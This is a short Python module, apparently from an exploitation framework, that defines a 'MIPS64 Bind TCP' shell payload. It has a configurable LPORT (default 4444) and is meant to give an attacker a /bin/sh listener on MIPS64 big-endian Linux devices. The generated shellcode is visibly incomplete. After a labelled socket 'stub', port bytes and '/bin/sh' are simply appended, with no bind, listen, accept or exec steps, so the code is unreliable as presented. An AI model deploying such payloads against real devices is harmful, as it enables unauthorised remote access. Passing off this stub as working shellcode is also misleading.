"""MIPS64 Bind TCP Shell."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "MIPS64 Bind TCP",
        "description": "Bind TCP shell for MIPS64 big-endian Linux.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LPORT": {"description": "Bind port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lport = int(self.options["LPORT"]["value"])
        port_bytes = lport.to_bytes(2, "big")
        return (
            b"\x24\x04\x10\x01"  # SYS_socket stub
            b"\x24\x05\x00\x02"  # AF_INET
            b"\x24\x06\x00\x01"  # SOCK_STREAM
            b"\x00\x00\x00\x0c"  # syscall
            + port_bytes
            + b"\x00\x00\x00\x00"  # INADDR_ANY
            + b"/bin/sh\x00"
        )
